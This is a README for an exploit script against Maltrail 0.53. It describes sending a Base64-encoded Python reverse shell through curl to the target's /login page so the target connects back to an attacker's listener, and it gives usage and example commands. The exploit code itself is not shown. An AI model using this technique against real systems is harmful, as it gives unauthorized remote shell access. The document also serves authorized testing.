# Maltrail 0.53 RCE
This script is designed to send a crafted exploit payload to a specified target URL. When the payload is executed on the target system, it attempts to spawn a reverse shell back to a specified listening IP and port.

## Prerequisites
- Python 3.x
- ``curl`` utility available in the script user system's PATH


## Usage
```css
python exploit.py [LISTENING_IP] [LISTENING_PORT] [TARGET_URL]
```

## Parameters:
- LISTENING_IP: The IP address for the exploit listener. This is where the reverse shell will connect back.
- LISTENING_PORT: The port number for the exploit listener. Ensure that this port is accessible and not being blocked by firewalls.
- TARGET_URL: The base URL of the target system. The script will append ``/login`` to this base URL to form the final target URL.

## Example:
```arduino
python exploit.py 192.168.1.10 8080 http://example.com
```

## How It Works

The script first encodes a Python-based reverse shell payload in Base64.
It then crafts a curl command to send this payload to the target URL's login page.
The payload, when executed on the target, decodes the Base64 string and runs the reverse shell code. This code connects back to the specified LISTENING_IP and LISTENING_PORT.
If successful, you should receive a reverse shell connection from the target.


## Caution
This tool is meant for educational purposes and authorized testing only. Always ensure you have proper authorization before testing against any systems.